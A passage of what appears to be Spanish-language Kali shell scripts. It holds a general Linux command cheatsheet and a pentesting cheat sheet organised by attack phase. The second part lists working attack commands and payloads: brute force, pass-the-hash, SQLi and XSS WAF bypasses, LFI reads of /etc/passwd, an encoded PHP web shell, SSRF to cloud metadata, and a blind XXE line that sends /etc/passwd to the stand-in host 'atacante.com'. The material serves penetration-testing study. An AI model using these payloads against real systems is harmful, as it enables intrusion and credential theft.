            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "sudo apt full-upgrade" "Actualización completa (puede eliminar paquetes)"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "sudo apt install <paquete>" "Instalar un paquete"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "sudo apt remove <paquete>" "Eliminar un paquete"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "sudo apt purge <paquete>" "Eliminar paquete y sus configs"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "sudo apt autoremove" "Eliminar dependencias no usadas"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "apt search <texto>" "Buscar paquetes por nombre/desc"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "apt show <paquete>" "Mostrar info detallada del paquete"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "apt list --installed" "Listar paquetes instalados"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "dpkg -i <archivo.deb>" "Instalar paquete .deb manualmente"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "dpkg -l" "Listar paquetes instalados (dpkg)"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "dpkg -L <paquete>" "Listar archivos de un paquete instalado"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "sudo dpkg --configure -a" "Reparar paquetes desconfigurados"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "compresion"|"compresión"|"compress"|"tar"|"zip")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        🗜️  COMPRESIÓN Y ARCHIVADO                ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "tar -cvf archivo.tar <dir>" "Crear tar sin comprimir"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "tar -xvf archivo.tar" "Extraer tar"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "tar -czvf archivo.tar.gz <dir>" "Crear tar.gz (gzip)"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "tar -xzvf archivo.tar.gz" "Extraer tar.gz"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "tar -cjvf archivo.tar.bz2 <dir>" "Crear tar.bz2 (bzip2)"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "tar -xjvf archivo.tar.bz2" "Extraer tar.bz2"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "zip -r archivo.zip <dir>" "Comprimir en ZIP"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "unzip archivo.zip" "Descomprimir ZIP"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "gzip <arch>" "Comprimir archivo individual (.gz)"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "gunzip <arch>.gz" "Descomprimir .gz"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "bzip2 <arch>" "Comprimir con bzip2"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "bunzip2 <arch>.bz2" "Descomprimir .bz2"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "xz <arch>" "Comprimir con xz (alta compresión)"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "7z a archivo.7z <dir>" "Comprimir con 7z (p7zip)"
            printf "${color_cmd}%-40s ${color_desc}%s${color_reset}\n" "7z x archivo.7z" "Extraer 7z"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "busqueda"|"búsqueda"|"buscar"|"search"|"grep"|"find")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        🔍  BÚSQUEDA DE ARCHIVOS Y CONTENIDO     ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "find <dir> -name <patrón>" "Buscar archivos por nombre"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "find <dir> -iname <patrón>" "Buscar por nombre (sin distinguir mayús)"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "find <dir> -type f" "Buscar solo archivos"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "find <dir> -type d" "Buscar solo directorios"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "find <dir> -size +100M" "Archivos mayores a 100MB"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "find <dir> -mtime -7" "Archivos modificados en últimos 7 días"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "find <dir> -perm 4000" "Archivos con SUID bit activado"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "grep <patrón> <arch>" "Buscar patrón en archivo"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "grep -r <patrón> <dir>" "Buscar recursivamente en directorio"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "grep -i <patrón> <arch>" "Buscar sin distinguir mayúsculas"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "grep -v <patrón> <arch>" "Mostrar líneas que NO coinciden"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "grep -c <patrón> <arch>" "Contar coincidencias"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "grep -E \"patrón1|patrón2\" <arch>" "Expresiones regulares extendidas"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "locate <patrón>" "Buscar rápido (requiere updatedb)"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "which <comando>" "Mostrar ruta de un ejecutable"
            printf "${color_cmd}%-45s ${color_desc}%s${color_reset}\n" "whereis <comando>" "Localizar binario, fuente y man page"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "disco"|"disk"|"df"|"du"|"espacio"|"storage")
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        💾  ESPACIO EN DISCO                      ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "df -h" "Espacio en disco (formato legible)"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "df -i" "Uso de inodos"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "du -sh <dir>" "Tamaño total de un directorio"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "du -h --max-depth=1 <dir>" "Tamaño por subdirectorio (1 nivel)"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "du -sh * | sort -rh" "Tamaño de todos los items, ordenados"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "ncdu" "Analizador interactivo de disco"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "lsblk" "Listar dispositivos de bloque"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "blkid" "UUID y tipo de sistema de archivos"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "fdisk -l" "Ver tabla de particiones"
            printf "${color_cmd}%-35s ${color_desc}%s${color_reset}\n" "mount" "Ver sistemas de archivos montados"
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
        "todo"|"all"|"completo"|"full")
            cheatsheet basicos
            echo
            cheatsheet directorios
            echo
            cheatsheet red
            echo
            cheatsheet permisos
            echo
            cheatsheet usuarios
            echo
            cheatsheet procesos
            echo
            cheatsheet paquetes
            echo
            cheatsheet compresion
            echo
            cheatsheet busqueda
            echo
            cheatsheet disco
            ;;
        *)
            # Búsqueda general en todas las categorías
            local found=0
            echo -e "${color_header}╔══════════════════════════════════════════════════╗${color_reset}"
            echo -e "${color_header}║        🔎  RESULTADOS DE BÚSQUEDA: \"${search}\"       ║${color_reset}"
            echo -e "${color_header}╠══════════════════════════════════════════════════╣${color_reset}"

            # Buscar en comandos y descripciones usando las tablas internas
            for cat in basicos directorios red permisos usuarios procesos paquetes compresion busqueda disco; do
                local output=$(cheatsheet "$cat" 2>/dev/null)
                local matching=$(echo "$output" | grep -i --color=always "$search")
                if [[ -n "$matching" ]]; then
                    echo -e "${color_sep}--- Categoría: $cat ---${color_reset}"
                    echo "$matching"
                    found=1
                fi
            done

            if [[ $found -eq 0 ]]; then
                echo -e "${color_desc}No se encontraron resultados para \"${search}\"${color_reset}"
                echo -e "${color_desc}Usa: ${color_cmd}cheatsheet${color_desc} para ver las categorías disponibles${color_reset}"
            fi
            echo -e "${color_header}╚══════════════════════════════════════════════════╝${color_reset}"
            ;;
    esac
}


# ============================================================
# ALIAS ADICIONALES ÚTILES PARA KALI
# ============================================================

# Atajos para el cheatsheet
alias cs='cheatsheet'
alias csb='cheatsheet basicos'
alias csd='cheatsheet directorios'
alias csr='cheatsheet red'
alias csp='cheatsheet permisos'
alias csu='cheatsheet usuarios'
alias csproc='cheatsheet procesos'
alias csapt='cheatsheet paquetes'
alias cstar='cheatsheet compresion'
alias csgrep='cheatsheet busqueda'
alias csdisk='cheatsheet disco'
alias cstodo='cheatsheet todo'

# Comandos que en Kali se usan mucho
alias ll='ls -la'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
alias ipa='ip a'
alias ports='ss -tulpn'
alias myip='curl -s ifconfig.me'
alias clean='sudo apt autoremove -y && sudo apt autoclean'
alias root='sudo su -'
alias listen='sudo netstat -tulpn | grep LISTEN'
alias pstree='ps aux --forest'
alias grep='grep --color=auto'
alias df='df -h'
alias du='du -h'
alias free='free -h'
''',

    "05_cpts_cheatsheet.sh": r'''#!/bin/bash

# ═══════════════════════════════════════════════════════════════
# 🏴‍☠️ PENTESTING CHEAT SHEET  —  by HackerAI (CPTS Edition)
# ═══════════════════════════════════════════════════════════════

hack() {
    local section="${1:-all}"
    
    # ─── Colores ───
    local R='\033[0;31m' G='\033[0;32m' Y='\033[1;33m' B='\033[0;34m' C='\033[0;36m' M='\033[0;35m'
    local W='\033[1;37m' N='\033[0m' BD='\033[1m' U='\033[4m' BL='\033[5m'
    
    # ─── Cabecera de sección ───
    header() {
        local title="$1" color="${2:-$C}"
        echo -e "\n${BD}${color}╔══════════════════════════════════════════════════════════════╗${N}"
        echo -e "${BD}${color}║  ${W}${U}${title}${N}${color}${N}"
        echo -e "${BD}${color}╚══════════════════════════════════════════════════════════════╝${N}"
    }
    
    # ─── Subsección ───
    sub() { echo -e "${BD}${M}[ $1 ]${N}"; }
    
    # ─── Comando ───
    cmd() { echo -e "  ${G}▶ $ ${N}${C}$1${N}"; }
    ex()  { echo -e "    ${Y}$1${N}"; }
    sep() { echo -e "  ${W}────────────────────────────────────────────────────────${N}"; }
    note() { echo -e "    ${W}# $1${N}"; }
    b() { echo -e "    ${B}$1${N}"; }

    # ─── Función para mostrar con paginador ───
    show() {
        if command -v bat &>/dev/null; then
            cat "$@" | bat -l bash --style=plain --paging=always 2>/dev/null
        elif command -v less &>/dev/null; then
            cat "$@" | less -R
        else
            cat "$@"
        fi
    }

    # ═══════════════════════════════════════════════════════════════════
    #  VARIABLES DE USO COMÚN
    # ═══════════════════════════════════════════════════════════════════
    # $TARGET  = IP o dominio objetivo
    # $DOMAIN  = Dominio (para AD)
    # $MY_IP   = Tu IP (atacante)
    # $SUBRED  = Subred (ej. 10.10.10.0/24)
    # $DC_IP   = IP del Domain Controller
    # $USER    = Usuario (para AD)
    # $PASS    = Contraseña
    # SecLists = /usr/share/seclists

    # ═══════════════════════════════════════════════════════════════════
    # FASE 0: RECONOCIMIENTO PASIVO (OSINT)
    # ═══════════════════════════════════════════════════════════════════
    recon_passive() {
        header "FASE 0 — RECONOCIMIENTO PASIVO (OSINT)"
        
        sub "WHOIS"
        cmd "whois \$TARGET"
        
        sub "DNS INFORMATION"
        cmd "dig \$DOMAIN ANY +noall +answer"
        cmd "dig \$DOMAIN A +short"
        cmd "dig \$DOMAIN MX +short"
        cmd "dig \$DOMAIN NS +short"
        cmd "dig \$DOMAIN TXT +short"
        
        sub "TRANSFERENCIA DE ZONA DNS"
        cmd "dig AXFR @ns1.\$DOMAIN \$DOMAIN"
        cmd "dnsrecon -d \$DOMAIN -t axfr -n \$TARGET"
        
        sub "SUBDOMINIOS PASIVOS"
        cmd "curl -s \"https://crt.sh/?q=%25.\${DOMAIN}&output=json\" | jq -r '.[].name_value' | sort -u"
        cmd "curl -s \"https://api.hackertarget.com/hostsearch/?q=\$DOMAIN\""
        cmd "curl -s \"https://sonar.omnisint.io/subdomains/\$DOMAIN\" | jq -r '.[]'"
        
        sub "SHODAN"
        cmd "shodan search hostname:\$DOMAIN"
        cmd "shodan host \$TARGET"
        
        sub "GOOGLE DORKS (reemplazar DOMAIN)"
        ex "site:DOMAIN intitle:\"index of\"           # Directorios abiertos"
        ex "site:DOMAIN inurl:admin                    # Paneles admin"
        ex "site:DOMAIN filetype:pdf                   # Documentos"
        ex "site:DOMAIN inurl:wp-content               # WordPress"
        ex "site:DOMAIN ext:sql | ext:bak | ext:old    # Backups"
        ex "site:DOMAIN inurl:\"php?id=\"              # Posible SQLi"
        ex "site:DOMAIN \"robots.txt\"                 # Robots"
        
        sub "EMAILS / USERS"
        cmd "theHarvester -d \$DOMAIN -b google,linkedin,bing"
        
        sub "GITHUB RECON"
        cmd "gitdorker -tf /path/tokens.txt -q \$DOMAIN"
        cmd "trufflehog3 -r https://github.com/\$ORG/\$REPO"
        
        sub "METADATOS DOCUMENTOS"
        cmd "metagoofil -d \$DOMAIN -t pdf,doc,xls -l 50"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 1: RECONOCIMIENTO ACTIVO
    # ═══════════════════════════════════════════════════════════════════
    recon_active() {
        header "FASE 1 — RECONOCIMIENTO ACTIVO"
        
        sub "HOST DISCOVERY"
        cmd "nmap -sn \$SUBRED/24 -oG live_hosts.txt"
        cmd "netdiscover -r \$SUBRED/24 -i eth0"
        cmd "arp-scan -l"
        
        sub "ESCANEO DE PUERTOS COMPLETO (S4vitar Style)"
        note "Escaneo completo de todos los puertos:"
        cmd "nmap -p- --open -T5 -n -Pn --min-rate 5000 \$TARGET -oA full_scan"
        note "Escaneo de servicios sobre los puertos encontrados:"
        cmd "nmap -sCV -p \$(cat full_scan.nmap | grep ^[0-9] | cut -d/ -f1 | tr '\n' ',' | sed 's/,\$//') -n -Pn --min-rate 5000 \$TARGET -oA services_scan"
        
        sub "ESCANEO SIGILOSO (evasión)"
        cmd "nmap -sS -T2 -f --source-port 53 -D RND:10 -n -Pn \$TARGET"
        cmd "nmap -sS -T2 -f --mtu 16 -D 10.0.0.1,10.0.0.2,\$MY_IP -g 53 \$TARGET"
        
        sub "ESCANEO UDP"
        cmd "nmap -sU --top-ports 100 -n -Pn \$TARGET"
        cmd "nmap -sU -p 161,162,137,138,500,4500 \$TARGET"
        
        sub "NSE SCRIPTS"
        cmd "nmap -sV --script http-headers,http-title,http-server-header,http-methods \$TARGET"
        cmd "nmap -sV --script dns-zone-transfer,dns-brute,dns-enum \$TARGET"
        cmd "nmap --script broadcast-ping --script broadcast-dhcp-discover"
        
        sub "ESCANEO RÁPIDO (estilo s4vitar — one-liner)"
        cmd "ports=\$(nmap -p- --open -T5 -n -Pn --min-rate 5000 \$TARGET | grep ^[0-9] | cut -d/ -f1 | tr '\n' ',' | sed 's/,\$//') && echo \"Puertos: \$ports\" && nmap -sCV -p \$ports -n -Pn --min-rate 5000 -oA s4v_fullscan \$TARGET"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 2: ENUMERACIÓN DE SERVICIOS
    # ═══════════════════════════════════════════════════════════════════
    enum_services() {
        header "FASE 2 — ENUMERACIÓN DE SERVICIOS"
        
        sub "🌐 WEB (80,443,8080,8443)"
        cmd "whatweb http://\$TARGET -v"
        cmd "wafw00f http://\$TARGET"
        cmd "identywaf http://\$TARGET                                # Identificar WAF"
        cmd "gobuster dir -u http://\$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -q"
        cmd "gobuster dir -u http://\$TARGET -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -x php,asp,aspx,jsp,do,action,txt,zip,bak"
        cmd "ffuf -u http://\$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 80 -ac"
        cmd "dirsearch -u http://\$TARGET -e php,asp,aspx,txt,zip -t 50"
        cmd "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://\$TARGET -H \"Host: FUZZ.\$DOMAIN\" -fc 400,404,500,502,301,302"
        cmd "arjun -u http://\$TARGET                                # Parámetros ocultos"
        
        sub "📂 FTP (21)"
        cmd "nmap -sV -p 21 --script ftp-anon,ftp-bounce,ftp-libopie \$TARGET"
        cmd "hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ftp://\$TARGET"
        cmd "wget -r --no-passive-ftp ftp://anonymous:anonymous@\$TARGET/   # Descarga recursiva"
        
        sub "🖥️ SMB (139,445)"
        cmd "netexec smb \$TARGET -u '' -p '' --shares"
        cmd "smbclient -L //\$TARGET/ -N"
        cmd "smbmap -H \$TARGET"
        cmd "enum4linux -a \$TARGET"
        cmd "enum4linux-ng -A \$TARGET"
        cmd "nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode \$TARGET"
        cmd "netexec smb \$TARGET -u 'guest' -p '' --rid-brute 5000   # RID bruteforce"
        
        sub "🗄️ NFS (111,2049)"
        cmd "showmount -e \$TARGET"
        cmd "nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs \$TARGET"
        cmd "mount -t nfs \$TARGET:/SHARE /mnt/nfs -o nolock"
        
        sub "📧 SMTP (25,587,465)"
        cmd "nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344 \$TARGET"
        cmd "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t \$TARGET"
        cmd "smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t \$TARGET"
        ex "telnet \$TARGET 25 → EHLO test.com → VRFY root"
        
        sub "🌍 DNS (53)"
        cmd "dig axfr @\$TARGET \$DOMAIN"
        cmd "dnsrecon -d \$DOMAIN -t axfr -n \$TARGET"
        cmd "dnsenum \$DOMAIN --dnsserver \$TARGET"
        cmd "gobuster dns -d \$DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -r \$TARGET"
        
        sub "🔧 SNMP (161)"
        cmd "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \$TARGET"
        cmd "snmp-check \$TARGET -c public"
        cmd "snmpwalk -v2c -c public \$TARGET"
        cmd "snmpenum -c public \$TARGET"
        cmd "nmap -sU -p 161 --script snmp-brute \$TARGET"
        
        sub "📋 LDAP (389,636)"
        cmd "ldapsearch -x -H ldap://\$TARGET -b \"dc=\$(echo \$DOMAIN | tr '.' ',dc=')\""
        cmd "ldapsearch -x -H ldap://\$TARGET -b \"dc=\$(echo \$DOMAIN | tr '.' ',dc=')\" \"(objectclass=user)\" samaccountname"
        cmd "windapsearch.py -d \$DOMAIN --dc-ip \$TARGET -U"
        cmd "ldapdomaindump -u '' -p '' ldap://\$TARGET 2>/dev/null"
        
        sub "🔗 RPC (135)"
        cmd "rpcinfo -p \$TARGET"
        cmd "rpcclient -U \"\" -N \$TARGET"
        ex "  rpcclient> srvinfo"
        ex "  rpcclient> enumdomusers"
        ex "  rpcclient> netshareenumall"
        
        sub "🗃️ MySQL (3306)"
        cmd "mysql -h \$TARGET -u root -p''"
        cmd "nmap -p 3306 --script mysql-empty-password,mysql-enum,mysql-users \$TARGET"
        
        sub "🗃️ MSSQL (1433)"
        cmd "nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info \$TARGET"
        cmd "netexec mssql \$TARGET -u 'sa' -p 'sa'"
        
        sub "🔴 Redis (6379)"
        cmd "redis-cli -h \$TARGET info"
        cmd "redis-cli -h \$TARGET keys '*'"
        
        sub "🍃 MongoDB (27017)"
        cmd "mongosh mongodb://\$TARGET:27017"
        cmd "nmap -p 27017 --script mongodb-info \$TARGET"
        
        sub "🖥️ RDP (3389)"
        cmd "nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption \$TARGET"
        cmd "crowbar -b rdp -s \$TARGET/32 -u admin -C passwords.txt -n 1"
        cmd "hydra -l administrator -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt rdp://\$TARGET"
        
        sub "⚡ WinRM (5985,5986)"
        cmd "netexec winrm \$TARGET -u 'Administrator' -p 'P@ssw0rd'"
        cmd "evil-winrm -i \$TARGET -u Administrator -p P@ssw0rd"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 3: VULNERABILITY ASSESSMENT
    # ═══════════════════════════════════════════════════════════════════
    vuln_scan() {
        header "FASE 3 — VULNERABILITY ASSESSMENT"
        
        sub "NSE VULNERABILIDADES"
        cmd "nmap -sV --script vuln \$TARGET -oA vuln_scan"
        cmd "nmap -sV --script exploit \$TARGET"
        cmd "nmap -sV --script http-vuln-* \$TARGET"
        
        sub "NIKTO"
        cmd "nikto -h http://\$TARGET -ssl -Format html -o nikto.html"
        cmd "nikto -h https://\$TARGET -ssl -Tuning 123456789"
        
        sub "NUCLEI"
        cmd "nuclei -u http://\$TARGET -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei.txt"
        cmd "nuclei -l live_hosts.txt -t cves/"
        
        sub "SEARCHSPLOIT"
        cmd "searchsploit \$SERVICE \$VERSION"
        cmd "searchsploit -t \$SERVICE"
        cmd "searchsploit --cve \$CVE_ID"
        
        sub "OPENVAS / GREENBONE (escáner completo)"
        cmd "gvm-start && gvm-cli --gmp-username admin --gmp-password pass -X '<get_tasks/>'"
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 4: WEB ATTACKS + WAF EVASION
    # ═══════════════════════════════════════════════════════════════════
    web_attacks() {
        header "FASE 4 — WEB ATTACKS + WAF EVASON"
        
        sub "🔍 WAF DETECTION"
        cmd "wafw00f http://\$TARGET"
        cmd "identywaf http://\$TARGET"
        cmd "nmap -p 443 --script http-waf-detect,http-waf-fingerprint \$TARGET"
        
        sub "🧙 BYPASS WAF — CABECERAS FALSAS"
        cmd "curl -H \"X-Forwarded-For: 127.0.0.1\" http://\$TARGET"
        cmd "curl -H \"X-Originating-IP: 127.0.0.1\" http://\$TARGET"
        cmd "curl -H \"X-Remote-IP: 127.0.0.1\" http://\$TARGET"
        cmd "curl -H \"Client-IP: 127.0.0.1\" http://\$TARGET"
        cmd "curl -H \"True-Client-IP: 127.0.0.1\" http://\$TARGET"
        cmd "curl -H \"X-Forwarded-Host: 127.0.0.1\" http://\$TARGET"
        
        sub "🧙 BYPASS WAF — USER-AGENT"
        cmd 'curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" http://$TARGET'
        
        sub "🧙 BYPASS WAF — PROXY / TOR"
        cmd "proxychains4 nmap -sV \$TARGET"
        cmd "proxychains4 gobuster dir -u http://\$TARGET -w wordlist.txt -t 10"
        cmd "sqlmap -u \"http://\$TARGET/page?id=1\" --tor --tor-type=SOCKS5 --check-tor"
        
        sub "💉 SQL INJECTION"
        cmd "sqlmap -u \"http://\$TARGET/page?id=1\" --batch --level 5 --risk 3 --random-agent"
        cmd "sqlmap -u \"http://\$TARGET/page?id=1\" --batch --tamper=space2comment --random-agent"
        cmd "sqlmap -u \"http://\$TARGET/page?id=1\" --batch --tamper=between,charencode --random-agent"
        cmd "sqlmap -u \"http://\$TARGET/page?id=1\" --batch --tamper=modsecurityversion --random-agent"
        cmd "sqlmap -u \"http://\$TARGET/page?id=1\" --batch --tamper=bluecoat --random-agent"
        cmd "sqlmap -u \"http://\$TARGET/page?id=1\" --batch --tamper=apr,base64encode,charencode,charunicodeencode --random-agent"
        cmd "sqlmap -u \"http://\$TARGET/page?id=1\" --batch --random-agent --tamper=space2comment --hex"
        cmd "sqlmap -r request.txt --batch --level 5 --risk 3 --tamper=between --random-agent"
        
        note "WAF Bypass SQLi — Payloads manuales:"
        ex "  ?id=1'/**/OR/**/1=1-- -                          # Comentarios"
        ex "  ?id=-1' UNION/**/SELECT/**/1,2,@@version-- -      # Comments en UNION"
        ex "  ?id=1'/*!14400OR*/1=1-- -                        # MySQL comentario condicional"
        ex "  ?id=1%00' UNION SELECT 1,2,3-- -                 # Null byte"
        ex "  ?id=1'--sp_password/**/OR/**/1=1-- -             # MSSQL sp_password"
        ex "  ?id=UNION%a0SELECT%a01,2,3                       # Non-breaking space"
        
        sub "📝 XSS + WAF BYPASS"
        cmd "dalfox url http://\$TARGET/page?param=test --waf-evasion"
        cmd "xsser -u \"http://\$TARGET/page?param=test\" -s"
        
        note "Bypass Cloudflare:"
        ex "  ?p=<ScRiPt>alert(1)</ScRiPt>               # Case bypass"
        ex "  ?p=<script%0a>alert(1)</script>             # Newline bypass"
        ex "  ?p=<script/**/>alert(1)</script>            # Comment bypass"
        ex "  ?p=<img src=x onerror=eval(atob('YWxlcnQoMSk='))>  # Base64"
        ex "  ?p=<svg/onload=alert(1)>                   # SVG vector"
        
        sub "📂 LFI/RFI + WAF BYPASS"
        cmd "?page=../../../etc/passwd"
        cmd "?page=....//....//....//etc/passwd"
        cmd "?page=..%252f..%252f..%252fetc/passwd       # Double URL encode"
        cmd "?page=..%c0%ae..%c0%ae..%c0%aeetc/passwd   # Unicode bypass"
        cmd "?page=../../../../etc/passwd%00             # Null byte"
        
        note "PHP Wrappers:"
        cmd "?page=php://filter/convert.base64-encode/resource=index"
        cmd "?page=php://input                           # POST: <?php system('id');?>"
        cmd "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==&cmd=id"
        
        sub "💻 COMMAND INJECTION + WAF BYPASS"
        note "Delimiters: ; | || & && \` \$( )"
        note "Space bypass: \${IFS} / %09 / %20 / {id}"
        note "Blacklist bypass: c''at c\"\"at ca\\t /???/???t /etc/pa??w?d"
        note "Hex encoding: printf \"\\x63\\x61\\x74\" /etc/passwd"
        
        sub "🔗 SSRF"
        cmd "?url=http://127.0.0.1:8080/admin"
        cmd "?url=http://[::1]:8080/admin"
        cmd "?url=http://0.0.0.0:8080/admin"
        cmd "?url=file:///etc/passwd"
        cmd "?url=http://169.254.169.254/latest/meta-data/   # AWS metadata"
        
        sub "📎 FILE UPLOAD BYPASS"
        note "Extensiones: .php .phtml .php5 .php.jpg .php%00.jpg .php;.jpg .php. .php. .jpg"
        note "Magic bytes: añadir GIF89a al inicio del archivo PHP"
        note "Content-Type: image/jpeg, image/png"
        note ".htaccess upload: AddType application/x-httpd-php .jpg"
        
        sub "📄 XXE"
        ex '<?xml version="1.0"?>'
        ex '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        ex '<root>&xxe;</root>'
        
        sub "Blind XXE (OOB)"
        note "Enviar a atacante:"
        ex '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://atacante.com/xxe.dtd"> %xxe;]>'
        note "Contenido de xxe.dtd:"
        ex '<!ENTITY % file SYSTEM "file:///etc/passwd">'
        ex '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://atacante.com/?data=%file;\'>"> %eval; %exfil;'
    }

    # ═══════════════════════════════════════════════════════════════════
    # FASE 5: PASSWORD ATTACKS
    # ═══════════════════════════════════════════════════════════════════
    password_attacks() {
        header "FASE 5 — PASSWORD ATTACKS (Fuerza Bruta)"
        
        sub "HYDRA"
        cmd "hydra -l admin -P wordlist.txt ftp://\$TARGET"
        cmd "hydra -L users.txt -P wordlist.txt ssh://\$TARGET"
        cmd "hydra -L users.txt -P wordlist.txt http-get://\$TARGET/login.php"
        cmd "hydra -l administrator -P wordlist.txt rdp://\$TARGET"
        cmd "hydra -l admin -P wordlist.txt smb://\$TARGET"
        cmd "hydra -l admin -P wordlist.txt mysql://\$TARGET"
        
        sub "MEDUSA"
        cmd "medusa -h \$TARGET -U users.txt -P wordlist.txt -M ssh"
        cmd "medusa -h \$TARGET -U users.txt -P wordlist.txt -M ftp"
        
        sub "CROWBAR (RDP, VNC, SSH Key)"
        cmd "crowbar -b rdp -s \$TARGET/32 -u admin -C passwords.txt -n 1"
        cmd "crowbar -b vnckey -s \$TARGET/32 -k key.txt"
        
        sub "NETEXEC (el mejor para AD)"
        cmd "netexec smb \$TARGET -u users.txt -p passwords.txt --continue-on-success"
        cmd "netexec smb \$TARGET -u users.txt -H hashes.txt                   # PtH"
        cmd "netexec smb \$TARGET -u 'Administrator' -H 'HASH:LMHASH'          # Pass The Hash"
        
        sub "KERBRUTE"
        cmd "kerbrute userenum -d \$DOMAIN --dc \$TARGET users.txt"
        cmd "kerbrute bruteuser -d \$DOMAIN --dc \$TARGET passwordlist.txt admin"
        
        sub "HASH CRACKING"
        cmd "hashcat -m 1000  ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force -O    # NTLM"
        cmd "hashcat -m 5600  netntlmv2.txt /usr/share/wordlists/rockyou.txt --force -O      # NetNTLMv2"
